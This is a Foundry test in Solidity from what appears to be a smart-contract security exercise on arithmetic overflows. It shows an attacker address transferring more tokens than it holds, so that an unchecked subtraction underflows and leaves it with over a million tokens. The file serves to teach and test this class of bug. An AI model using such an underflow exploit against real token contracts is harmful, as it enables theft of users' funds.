//SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/arithmetic-overflows-2/SimpleToken.sol";

/**
@dev run "forge test --match-contract AO2" 
*/
contract TestAO2 is Test {
    SimpleToken simpleToken;

    address deployer;
    address attacker1;
    address attacker2;

    uint256 attacker1Balance;

    function setUp() public {
        deployer = address(1);
        attacker1 = address(2);
        attacker2 = address(3);

        vm.startPrank(deployer);
        simpleToken = new SimpleToken();
        simpleToken.mint(deployer, 10000 ether);
        simpleToken.mint(attacker1, 10 ether);
        vm.stopPrank();
    }

    function test() public {
        vm.prank(attacker1);
        simpleToken.transfer(attacker2, 12 ether);

        // Attacker should have a lot of tokens (at least more than 1 million)
        assertEq(simpleToken.getBalance(attacker1) > 1000000 ether, true);
    }
}
